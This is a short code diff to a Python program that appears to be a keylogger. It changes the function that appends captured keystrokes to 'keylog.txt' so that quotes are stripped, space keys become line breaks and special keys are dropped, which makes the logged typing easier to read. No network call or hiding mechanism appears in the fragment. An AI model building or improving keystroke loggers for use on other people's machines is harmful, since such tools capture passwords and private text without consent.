@@ -32,7 +32,11 @@ def on_press(key):
 def write_file(keys):
     with open("keylog.txt", "a") as f:
         for key in keys:
-            f.write(str(key))
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:  # .find looks into the string
+                f.write('\n')
+            elif k.find("Key") == -1:
+                f.write(k)
 
 
 def on_release(key):
